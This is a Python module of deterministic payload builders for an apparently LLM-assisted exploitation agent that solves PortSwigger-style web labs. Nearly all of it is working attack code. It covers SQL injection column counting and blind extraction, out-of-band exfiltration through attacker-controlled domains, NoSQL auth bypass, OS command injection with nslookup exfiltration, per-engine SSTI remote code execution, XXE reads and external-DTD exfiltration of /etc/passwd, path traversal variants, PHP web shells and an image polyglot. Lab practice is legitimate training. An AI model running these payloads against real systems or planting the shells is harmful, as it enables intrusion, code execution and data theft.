"""
=============================================================================
Reynard — Injection-family deterministic routines
=============================================================================
Reusable, side-effect-free building blocks for the INJECTION attack family so
the exploitation fast-paths (and the guided LLM path) share one correct,
unit-testable implementation instead of re-deriving payloads per lab.

Nothing here makes a network call. Every "solver" takes an ``oracle`` — a
``Callable[[str], bool]`` (or a small variant) — that the caller wires to the
live target via ``http_request``. This keeps the algorithms (UNION column
count, boolean/time-blind bit extraction) fully testable offline with a fake
oracle, exactly as the plan requires.

Contents:
  - SQL injection: UNION column-count solvers, text-column finder, UNION SELECT
    builder, per-DBMS payloads (comment/concat/substring/version/tables/sleep),
    boolean + time-blind bit-extraction oracle, OOB exfil payload builder, and
    the XML-encoding filter bypass encoder.
  - NoSQL injection: operator auth-bypass bodies, syntax probes, extraction.
  - OS command injection: separator payloads, blind time-delay, output
    redirection, OOB interaction.
  - SSTI: engine-fingerprint arithmetic probes, detector, per-engine RCE.
  - XXE: file-read / SSRF / blind-OOB / external-DTD exfil / error-based /
    XInclude / SVG payload builders.
  - Path traversal: the full ordered variant list (simple, absolute, nested
    strip bypass, single/double URL-decode, start-of-path, null-byte).
  - File upload: web-shell bodies + filename / content-type bypass variants.
=============================================================================
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Callable, Iterable

# An oracle answers "did this payload behave as a positive?" for the caller's
# chosen signal (row expansion, no-error, boolean-true, or time delay).
Oracle = Callable[[str], bool]

# =============================================================================
# SQL injection — UNION-based
# =============================================================================

DEFAULT_MARKER = "rEyNaRd"


def order_by_payload(n: int, *, prefix: str = "1", quote: str = "'",
                     comment: str = "-- ") -> str:
    """Build an ``ORDER BY n`` column-count probe (``1' ORDER BY 3-- ``)."""
    return f"{prefix}{quote} ORDER BY {int(n)}{comment}"


def union_nulls_payload(n: int, *, quote: str = "'", comment: str = "-- ",
                        null: str = "NULL", from_table: str = "") -> str:
    """Build a ``UNION SELECT NULL,NULL,...`` column-count probe."""
    nulls = ",".join([null] * int(n))
    tail = f" FROM {from_table}" if from_table else ""
    return f"{quote} UNION SELECT {nulls}{tail}{comment}"


def solve_column_count_order_by(oracle: Oracle, *, max_columns: int = 25,
                                prefix: str = "1", quote: str = "'",
                                comment: str = "-- ") -> int | None:
    """Determine the column count with ``ORDER BY``.

    ``oracle(payload)`` must return True while ``n`` is a valid column index
    and False once ``n`` exceeds the real column count (the app errors). The
    count is the highest ``n`` that still succeeded.
    """
    count = 0
    for n in range(1, max_columns + 1):
        if oracle(order_by_payload(n, prefix=prefix, quote=quote, comment=comment)):
            count = n
        else:
            break
    return count or None


def solve_column_count_union(oracle: Oracle, *, max_columns: int = 25,
                             quote: str = "'", comment: str = "-- ",
                             from_table: str = "") -> int | None:
    """Determine the column count with ``UNION SELECT NULL,...``.

    ``oracle(payload)`` returns True only when the number of NULLs matches the
    real column count. Returns that ``n`` (the first success).
    """
    for n in range(1, max_columns + 1):
        if oracle(union_nulls_payload(n, quote=quote, comment=comment,
                                      from_table=from_table)):
            return n
    return None


def union_select_payload(num_columns: int, expressions: dict[int, str] | None = None,
                         *, quote: str = "'", comment: str = "-- ",
                         from_table: str = "", null: str = "NULL") -> str:
    """Build a ``UNION SELECT`` payload placing ``expressions`` by 1-based column.

    Columns not named in ``expressions`` are filled with ``NULL`` (or the
    DBMS-appropriate placeholder passed via ``null``). Oracle callers pass
    ``from_table='dual'``.
    """
    expressions = expressions or {}
    cols = [str(expressions.get(i, null)) for i in range(1, int(num_columns) + 1)]
    tail = f" FROM {from_table}" if from_table else ""
    return f"{quote} UNION SELECT {','.join(cols)}{tail}{comment}"


def union_text_column_probes(num_columns: int, *, marker: str = DEFAULT_MARKER,
                             quote: str = "'", comment: str = "-- ",
                             from_table: str = "") -> list[tuple[int, str]]:
    """Yield ``(column_index, payload)`` that place a string marker in each
    column in turn, so the caller can find which column accepts text (the
    marker appears in the response)."""
    probes: list[tuple[int, str]] = []
    for i in range(1, int(num_columns) + 1):
        payload = union_select_payload(
            num_columns, {i: f"'{marker}'"},
            quote=quote, comment=comment, from_table=from_table,
        )
        probes.append((i, payload))
    return probes


# =============================================================================
# SQL injection — per-DBMS dialect table
# =============================================================================

@dataclass(frozen=True)
class DbmsDialect:
    name: str
    comment: str                 # inline comment that swallows the rest of line
    version_query: str           # SELECT expr yielding the version banner
    tables_query: str            # SELECT listing table names
    from_dual: str               # " FROM dual" for Oracle, "" elsewhere
    _concat_sep: str             # "||" / "+" (empty => function form)
    _concat_fn: str              # "CONCAT" when function form is required
    _substr_fn: str              # SUBSTRING / SUBSTR
    _sleep_tpl: str              # unconditional delay, {s} seconds
    _cond_time_tpl: str          # conditional delay, {cond} + {s}

    def concat(self, parts: Iterable[str]) -> str:
        parts = list(parts)
        if self._concat_fn:
            return f"{self._concat_fn}({','.join(parts)})"
        return self._concat_sep.join(parts)

    def substring(self, expr: str, index: int, length: int = 1) -> str:
        return f"{self._substr_fn}({expr},{int(index)},{int(length)})"

    def time_delay(self, seconds: int = 10) -> str:
        return self._sleep_tpl.format(s=int(seconds))

    def conditional_time(self, condition: str, seconds: int = 10) -> str:
        return self._cond_time_tpl.format(cond=condition, s=int(seconds))


DBMS_DIALECTS: dict[str, DbmsDialect] = {
    "oracle": DbmsDialect(
        name="oracle",
        comment="-- ",
        version_query="SELECT banner FROM v$version",
        tables_query="SELECT table_name FROM all_tables",
        from_dual=" FROM dual",
        _concat_sep="||", _concat_fn="",
        _substr_fn="SUBSTR",
        _sleep_tpl="dbms_pipe.receive_message(('a'),{s})",
        _cond_time_tpl=(
            "SELECT CASE WHEN ({cond}) THEN "
            "'a'||dbms_pipe.receive_message(('a'),{s}) ELSE NULL END FROM dual"
        ),
    ),
    "mysql": DbmsDialect(
        name="mysql",
        comment="#",
        version_query="SELECT @@version",
        tables_query="SELECT table_name FROM information_schema.tables",
        from_dual="",
        _concat_sep="", _concat_fn="CONCAT",
        _substr_fn="SUBSTRING",
        _sleep_tpl="SLEEP({s})",
        _cond_time_tpl="SELECT IF(({cond}),SLEEP({s}),0)",
    ),
    "microsoft": DbmsDialect(
        name="microsoft",
        comment="-- ",
        version_query="SELECT @@version",
        tables_query="SELECT table_name FROM information_schema.tables",
        from_dual="",
        _concat_sep="+", _concat_fn="",
        _substr_fn="SUBSTRING",
        _sleep_tpl="WAITFOR DELAY '0:0:{s}'",
        _cond_time_tpl="IF ({cond}) WAITFOR DELAY '0:0:{s}'",
    ),
    "postgresql": DbmsDialect(
        name="postgresql",
        comment="-- ",
        version_query="SELECT version()",
        tables_query="SELECT table_name FROM information_schema.tables",
        from_dual="",
        _concat_sep="||", _concat_fn="",
        _substr_fn="SUBSTRING",
        _sleep_tpl="SELECT pg_sleep({s})",
        _cond_time_tpl=(
            "SELECT CASE WHEN ({cond}) THEN pg_sleep({s}) ELSE pg_sleep(0) END"
        ),
    ),
}

# MySQL/Microsoft share ``@@version``; Oracle and PostgreSQL are the tell-tales.
VERSION_PROBES: list[tuple[str, str]] = [
    ("mysql/microsoft", "SELECT @@version"),
    ("oracle", "SELECT banner FROM v$version"),
    ("postgresql", "SELECT version()"),
]


def get_dialect(name: str) -> DbmsDialect:
    """Return the dialect table for a DBMS name (default: mysql)."""
    key = (name or "").strip().lower()
    aliases = {
        "mssql": "microsoft", "sqlserver": "microsoft", "sql server": "microsoft",
        "postgres": "postgresql", "psql": "postgresql", "maria": "mysql",
        "mariadb": "mysql",
    }
    key = aliases.get(key, key)
    return DBMS_DIALECTS.get(key, DBMS_DIALECTS["mysql"])


def multi_value_expression(dbms: str, columns: Iterable[str],
                           separator: str = "~") -> str:
    """Concatenate multiple columns into ONE text column (per-DBMS).

    Used by the "retrieve multiple values in a single column" labs, e.g.
    Oracle ``username||'~'||password`` or MySQL ``CONCAT(username,'~',password)``.
    """
    dialect = get_dialect(dbms)
    parts: list[str] = []
    for i, col in enumerate(columns):
        if i:
            parts.append(f"'{separator}'")
        parts.append(str(col))
    return dialect.concat(parts)


# =============================================================================
# SQL injection — blind (boolean / time) bit extraction
# =============================================================================

def binary_search_value(ge_oracle: Callable[[int], bool],
                        low: int = 32, high: int = 126) -> int:
    """Binary-search an integer in ``[low, high]``.

    ``ge_oracle(mid)`` returns True when the hidden value is ``>= mid``. Works
    for any blind signal (boolean response OR time delay), because the caller
    supplies the comparison. Returns the recovered integer.
    """
    lo, hi = low, high
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if ge_oracle(mid):
            lo = mid
        else:
            hi = mid - 1
    return lo


def extract_string_binary(char_ge_oracle: Callable[[int, int], bool],
                          length: int, *, low: int = 32, high: int = 126) -> str:
    """Recover a string char-by-char via binary search.

    ``char_ge_oracle(index, code)`` (1-based ``index``) returns True when the
    character code at that position is ``>= code``. Suitable for both
    conditional-response (boolean) and time-delay blind SQLi.
    """
    out: list[str] = []
    for i in range(1, int(length) + 1):
        code = binary_search_value(lambda c, _i=i: char_ge_oracle(_i, c),
                                   low=low, high=high)
        out.append(chr(code))
    return "".join(out)


def discover_length(length_ge_oracle: Callable[[int], bool],
                    *, max_length: int = 64) -> int:
    """Discover a hidden string's length via binary search on ``>=``.

    ``length_ge_oracle(n)`` returns True when the real length is ``>= n``.
    """
    return binary_search_value(length_ge_oracle, low=0, high=max_length)


def boolean_condition(dbms: str, subquery: str, index: int, code: int,
                      *, op: str = ">") -> str:
    """Build a blind comparison like ``ASCII(SUBSTRING((<subquery>),i,1))>n``."""
    dialect = get_dialect(dbms)
    substr = dialect.substring(f"({subquery})", index, 1)
    return f"ASCII({substr}){op}{int(code)}"


# =============================================================================
# SQL injection — OOB (out-of-band) interaction + data exfil
# =============================================================================

def oob_sqli_payload(dbms: str, collaborator_domain: str,
                     data_expr: str | None = None) -> str:
    """DBMS-specific OOB payload; embeds ``data_expr`` for exfil when given.

    Oracle uses the XXE-in-SQL trick (works unprivileged); Microsoft uses
    ``xp_dirtree``; PostgreSQL uses ``copy ... to program``; MySQL relies on a
    UNC ``LOAD_FILE`` (Windows only).
    """
    key = get_dialect(dbms).name
    domain = collaborator_domain.strip().rstrip("/")
    if key == "oracle":
        if data_expr:
            host = f"'||(SELECT {data_expr}{get_dialect('oracle').from_dual})||'.{domain}"
        else:
            host = domain
        return (
            "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" "
            "encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "
            f"\"http://{host}/\"> %remote;]>'),'/l') FROM dual"
        )
    if key == "microsoft":
        return f"exec master..xp_dirtree '//{domain}/a'"
    if key == "postgresql":
        return (
            "copy (SELECT '') to program "
            f"'nslookup {domain}'"
        )
    # mysql (Windows only)
    return f"SELECT LOAD_FILE('\\\\\\\\{domain}\\\\a')"


# =============================================================================
# SQL injection — XML-encoding filter bypass
# =============================================================================

def xml_entity_encode(text: str, *, hexadecimal: bool = True) -> str:
    """Encode every character as a numeric XML/HTML entity.

    Used by "SQL injection with filter bypass via XML encoding": the WAF only
    inspects the literal bytes, so hex-encoding the SQL keywords smuggles the
    payload past it while the XML parser still decodes it.
    """
    if hexadecimal:
        return "".join(f"&#x{ord(c):x};" for c in text)
    return "".join(f"&#{ord(c)};" for c in text)


def xml_encoded_injection(payload: str, *, field_tag: str = "productId",
                          store_tag: str = "storeId", store_value: str = "1",
                          hexadecimal: bool = True) -> str:
    """Build the XML body with the SQL payload entity-encoded inside a field."""
    encoded = xml_entity_encode(payload, hexadecimal=hexadecimal)
    return (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        f"<stockCheck><{field_tag}>{encoded}</{field_tag}>"
        f"<{store_tag}>{store_value}</{store_tag}></stockCheck>"
    )


# =============================================================================
# NoSQL injection
# =============================================================================

def nosql_auth_bypass_json(username: str = "administrator", *,
                           user_field: str = "username",
                           pass_field: str = "password",
                           operator: str = "$ne", value: str = "") -> dict:
    """Operator-injection auth-bypass body (``password: {"$ne": ""}``)."""
    return {user_field: username, pass_field: {operator: value}}


def nosql_auth_bypass_variants(username: str = "administrator", *,
                               user_field: str = "username",
                               pass_field: str = "password") -> list[dict]:
    """Common NoSQL operator auth-bypass bodies to try in order."""
    return [
        {user_field: username, pass_field: {"$ne": ""}},
        {user_field: username, pass_field: {"$gt": ""}},
        {user_field: {"$ne": ""}, pass_field: {"$ne": ""}},
        {user_field: {"$regex": "admin.*"}, pass_field: {"$ne": ""}},
    ]


def nosql_injection_strings() -> list[str]:
    """Syntax-injection probes for string-context (URL/query) NoSQL params."""
    return [
        "'",
        "\\",
        "';return 'a'=='a' && ''=='",
        "'||'1'=='1",
        "' && this.password.match(/.*/)//",
        "admin' || '1'=='1",
    ]


def nosql_where_extract(field: str, prefix: str, char: str) -> str:
    """A ``$where`` boolean-extraction condition testing one char of ``field``."""
    return f"this.{field}.match(/^{re.escape(prefix)}{re.escape(char)}/)"


def nosql_unknown_field_probe(known_field: str = "username",
                              value: str = "admin") -> dict:
    """Probe used to detect/exploit unknown-field extraction with ``$where``."""
    return {known_field: value,
            "$where": "Object.keys(this)[0].match('^.{0}.*')"}


# =============================================================================
# OS command injection
# =============================================================================

COMMAND_SEPARATORS: list[str] = [
    ";", "&", "&&", "|", "||", "\n", "`{cmd}`", "$({cmd})",
]


def command_injection_values(base: str = "1", *, command: str = "whoami",
                             token: str = "") -> list[tuple[str, str]]:
    """Injected parameter VALUES for simple in-band command injection.

    When ``token`` is given the command is ``echo <token>`` so the caller can
    verify deterministically (the token appears in the response but never in
    the baseline). Returns ``(separator_name, injected_value)`` pairs.
    """
    cmd = f"echo {token}" if token else command
    values: list[tuple[str, str]] = []
    for sep in (";", "&", "&&", "|", "||"):
        values.append((sep, f"{base}{sep}{cmd}"))
        values.append((f"{sep}spaced", f"{base} {sep} {cmd} {sep}"))
    values.append(("newline", f"{base}\n{cmd}\n"))
    values.append(("backtick", f"{base}`{cmd}`"))
    values.append(("subshell", f"{base}$({cmd})"))
    return values


def command_time_delay_values(base: str = "1", *, seconds: int = 10,
                              os_family: str = "unix") -> list[tuple[str, str]]:
    """Blind time-delay command-injection values (per OS family)."""
    if os_family == "windows":
        payloads = [f"ping -n {seconds + 1} 127.0.0.1"]
    else:
        payloads = [f"sleep {seconds}", f"ping -c {seconds} 127.0.0.1"]
    out: list[tuple[str, str]] = []
    for p in payloads:
        for sep in ("&", ";", "|", "&&"):
            out.append((f"{p.split()[0]}{sep}", f"{base}{sep}{p}{sep}"))
    return out


def command_output_redirect_values(base: str = "1", *, command: str = "whoami",
                                    web_root: str = "/var/www/images",
                                    out_name: str = "output.txt") -> tuple[str, str]:
    """Blind output-redirection: write command output to a web-served path.

    Returns ``(injected_value, retrieval_filename)``; the caller reads the
    file back from the static path to recover the command output.
    """
    value = f"{base}& {command} > {web_root.rstrip('/')}/{out_name} &"
    return value, out_name


def command_oob_values(collaborator_domain: str, base: str = "1", *,
                       data_command: str = "") -> list[tuple[str, str]]:
    """Blind OOB command injection; ``data_command`` exfils output via subdomain."""
    domain = collaborator_domain.strip().rstrip("/")
    if data_command:
        interaction = f"nslookup `{data_command}`.{domain}"
    else:
        interaction = f"nslookup {domain}"
    out: list[tuple[str, str]] = []
    for sep in ("&", ";", "|", "&&"):
        out.append((f"oob{sep}", f"{base}{sep}{interaction}{sep}"))
    return out


# =============================================================================
# SSTI — server-side template injection
# =============================================================================

SSTI_POLYGLOT = "${{<%[%'\"}}%\\"

# (engine, probe, expected substring in a *successful* evaluation)
SSTI_ARITHMETIC_PROBES: list[tuple[str, str, str]] = [
    ("erb", "<%= 7*7 %>", "49"),
    ("freemarker", "${7*7}", "49"),
    ("smarty", "{7*7}", "49"),
    ("jinja2", "{{7*7}}", "49"),
    ("twig", "{{7*7}}", "49"),
    ("jinja2_native", "{{7*'7'}}", "7777777"),
    ("twig_string", "{{7*'7'}}", "49"),
    ("velocity", "#set($x=7*7)$x", "49"),
    ("handlebars", "{{#with 7}}{{this}}{{/with}}", "7"),
]


def ssti_arithmetic_probes() -> list[tuple[str, str, str]]:
    """Return the engine-fingerprint arithmetic probes."""
    return list(SSTI_ARITHMETIC_PROBES)


def ssti_detect_engine(results: dict[str, str]) -> str:
    """Infer the template engine from ``{probe: rendered_output}``.

    ``{{7*7}}``→49 with ``{{7*'7'}}``→7777777 is Jinja2/Python; →49 for the
    string form is Twig/PHP. ``${7*7}``→49 is FreeMarker; ``<%= 7*7 %>``→49 is
    ERB/Ruby; ``{7*7}``→49 (and the braces forms fail) is Smarty.
    """
    def hit(probe: str, expected: str) -> bool:
        return expected in str(results.get(probe, ""))

    if hit("{{7*7}}", "49"):
        if hit("{{7*'7'}}", "7777777"):
            return "jinja2"
        if hit("{{7*'7'}}", "49"):
            return "twig"
        return "jinja2"
    if hit("${7*7}", "49"):
        return "freemarker"
    if hit("<%= 7*7 %>", "49"):
        return "erb"
    if hit("{7*7}", "49"):
        return "smarty"
    if hit("#set($x=7*7)$x", "49"):
        return "velocity"
    return ""


SSTI_RCE_PAYLOADS: dict[str, str] = {
    "jinja2": "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
    "twig": "{{['{cmd}']|filter('system')}}",
    "freemarker": (
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
        "${ex(\"{cmd}\")}"
    ),
    "velocity": (
        "#set($e=$class.inspect(\"java.lang.Runtime\").type.getRuntime()"
        ".exec(\"{cmd}\"))$e.waitFor()"
    ),
    "erb": "<%= `{cmd}` %>",
    "smarty": "{system('{cmd}')}",
    "mako": "${__import__('os').popen('{cmd}').read()}",
    "handlebars": (
        "{{#with \"s\" as |string|}}{{#with (string.sub.apply 0 \"constructor\")}}"
        "{{/with}}{{/with}}"
    ),
}


def ssti_rce_payload(engine: str, command: str = "id") -> str:
    """Return an engine-specific RCE payload (empty string if unknown)."""
    tpl = SSTI_RCE_PAYLOADS.get((engine or "").strip().lower(), "")
    return tpl.replace("{cmd}", command) if tpl else ""


# =============================================================================
# XXE — XML external entity
# =============================================================================

def xxe_doctype(entity: str, system_uri: str) -> str:
    """A minimal ``<!DOCTYPE>`` declaring one general external entity."""
    return f'<!DOCTYPE foo [ <!ENTITY {entity} SYSTEM "{system_uri}"> ]>'


def xxe_file_read_body(field_tag: str = "productId", *, file: str = "/etc/passwd",
                       entity: str = "xxe", store_tag: str = "storeId",
                       store_value: str = "1") -> str:
    """Full XXE file-retrieval body for the classic stock-check shape."""
    doctype = xxe_doctype(entity, f"file://{file}")
    return (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        f"{doctype}"
        f"<stockCheck><{field_tag}>&{entity};</{field_tag}>"
        f"<{store_tag}>{store_value}</{store_tag}></stockCheck>"
    )


def xxe_ssrf_body(url: str, field_tag: str = "productId", *, entity: str = "xxe",
                  store_tag: str = "storeId", store_value: str = "1") -> str:
    """XXE-to-SSRF body: the entity points at an internal URL."""
    doctype = xxe_doctype(entity, url)
    return (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        f"{doctype}"
        f"<stockCheck><{field_tag}>&{entity};</{field_tag}>"
        f"<{store_tag}>{store_value}</{store_tag}></stockCheck>"
    )


def xxe_oob_inline(collaborator_url: str) -> str:
    """Inline blind-OOB DOCTYPE using a parameter entity."""
    url = collaborator_url.strip().rstrip("/")
    return (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        f'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{url}/"> %xxe; ]>'
        "<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
    )


def xxe_external_dtd(collaborator_url: str, *, file: str = "/etc/passwd") -> str:
    """Malicious external DTD (host on exploit server) for blind OOB exfil.

    The lab body then references it with
    ``<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://EXPLOIT/exploit.dtd"> %xxe;]>``.
    """
    url = collaborator_url.strip().rstrip("/")
    return (
        f'<!ENTITY % file SYSTEM "file://{file}">\n'
        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
        f"'http://{url}/?x=%file;'>\">\n"
        "%eval;\n"
        "%exfil;\n"
    )


def xxe_error_based_dtd(*, file: str = "/etc/passwd") -> str:
    """External DTD that leaks file contents through a parse error message."""
    return (
        f'<!ENTITY % file SYSTEM "file://{file}">\n'
        '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
        "'file:///nonexistent/%file;'>\">\n"
        "%eval;\n"
        "%error;\n"
    )


def xxe_reference_external_dtd(dtd_url: str) -> str:
    """Body that pulls in an attacker-hosted external DTD via parameter entity."""
    return (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{dtd_url}"> %xxe;]>'
        "<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
    )


def xinclude_payload(file: str = "/etc/passwd") -> str:
    """XInclude fragment for when no DOCTYPE is allowed (value injection)."""
    return (
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include parse="text" href="file://{file}"/></foo>'
    )


def svg_xxe(file: str = "/etc/passwd", *, entity: str = "xxe") -> str:
    """Malicious SVG carrying an XXE for image/SVG upload parsers."""
    doctype = xxe_doctype(entity, f"file://{file}")
    return (
        "<?xml version=\"1.0\" standalone=\"yes\"?>"
        f"{doctype}"
        '<svg width="128px" height="128px" '
        'xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
        f'<text font-size="16" x="0" y="16">&{entity};</text></svg>'
    )


# =============================================================================
# Path traversal
# =============================================================================

def path_traversal_payloads(target: str = "/etc/passwd", *,
                            depth: int = 8) -> list[tuple[str, str]]:
    """Ordered path-traversal variants covering every PortSwigger sub-variant.

    Returns ``(variant_name, payload)`` pairs: simple traversal, absolute-path
    bypass, non-recursive strip bypass (``....//``), single and double URL
    decode, start-of-path validation, and null-byte + extension.
    """
    leaf = target.lstrip("/")               # "etc/passwd"
    dotdot = "../" * depth
    return [
        ("simple", f"{dotdot}{leaf}"),
        ("absolute", f"/{leaf}"),
        ("nested_strip_bypass", ("....//" * depth) + leaf),
        ("nested_strip_bypass_backslash", ("....\\/" * depth) + leaf),
        ("single_url_encode", ("%2e%2e%2f" * depth) + leaf),
        ("double_url_encode", ("%252e%252e%252f" * depth) + leaf),
        ("start_of_path", f"/var/www/images/{dotdot}{leaf}"),
        ("null_byte", f"{dotdot}{leaf}%00.png"),
        ("utf8_overlong", ("..%c0%af" * depth) + leaf),
    ]


_ETC_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.S)


def looks_like_etc_passwd(text: str) -> bool:
    """True when a response body clearly contains ``/etc/passwd`` content."""
    return bool(_ETC_PASSWD_RE.search(text or ""))


# =============================================================================
# File upload
# =============================================================================

def php_web_shell(command_param: str = "cmd") -> str:
    """A minimal PHP web shell (RCE via a GET parameter)."""
    return f"<?php echo system($_GET['{command_param}']); ?>"


def php_read_secret_shell(secret_path: str = "/home/carlos/secret") -> str:
    """PortSwigger basic-upload web shell that prints a fixed secret file."""
    return f"<?php echo file_get_contents('{secret_path}'); ?>"


def upload_filename_variants(basename: str = "exploit", *,
                             ext: str = "php") -> list[tuple[str, str]]:
    """Filename bypasses: blacklist, obfuscated, double, null-byte, traversal."""
    return [
        ("plain", f"{basename}.{ext}"),
        ("blacklist_php5", f"{basename}.php5"),
        ("blacklist_phtml", f"{basename}.phtml"),
        ("case_mixed", f"{basename}.pHp"),
        ("double_extension", f"{basename}.{ext}.jpg"),
        ("trailing_dot", f"{basename}.{ext}."),
        ("null_byte", f"{basename}.{ext}%00.jpg"),
        ("path_traversal", f"../{basename}.{ext}"),
        ("htaccess", ".htaccess"),
    ]


def upload_content_types() -> list[str]:
    """Content-Type values to try when the app validates the MIME type."""
    return ["image/jpeg", "image/png", "image/gif", "text/plain"]


def polyglot_php_jpg(command_param: str = "cmd") -> bytes:
    """A JPEG-header polyglot carrying a PHP shell (magic-byte bypass)."""
    jpeg_magic = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01"
    return jpeg_magic + php_web_shell(command_param).encode("latin-1")
